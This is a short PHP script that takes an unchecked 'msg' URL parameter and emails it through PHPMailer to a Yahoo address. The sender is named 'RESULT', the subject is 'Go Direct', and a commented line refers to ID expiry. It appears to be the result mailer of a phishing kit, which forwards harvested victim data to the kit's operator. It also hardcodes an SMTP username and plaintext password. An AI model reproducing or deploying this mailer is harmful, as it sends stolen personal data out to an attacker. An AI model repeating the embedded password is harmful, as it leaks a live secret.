<?php
// Include config file
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require './vendor/autoload.php';

$mail = new PHPMailer(true);



if (isset($_GET["msg"])) {
    $msg = $_GET["msg"];

    try {
        // Server settings
        $mail->SMTPDebug = 0; // Enable verbose debug output
        $mail->isSMTP(); // Set mailer to use SMTP
        $mail->Host = 'mail.epmt.site'; // Specify main and backup SMTP servers
        $mail->SMTPAuth = true; // Enable SMTP authentication
        $mail->Username = 'info@epmt.site'; // SMTP username
        $mail->Password = 'UY5tt^7..h(*'; // SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port = 465;

        // Recipients
        $mail->setFrom('info@epmt.site', 'RESULT');
        $mail->addAddress('preshitech@yahoo.com'); // Add a recipient

        // Content
        $mail->isHTML(true); // Set email format to HTML
        $mail->Subject = 'Go Direct';



        // $bodyContent .= "Expiry of ID: " . $_POST['exp'] . "\n";

        $mail->Body = nl2br($msg); // Convert newlines to <br> tags for HTML email


        $mail->send();
        echo '{Message has been sent}';
    } catch (Exception $e) {
        echo "{Message could not be sent. Mailer Error: {$mail->ErrorInfo}}";
    }
}



?>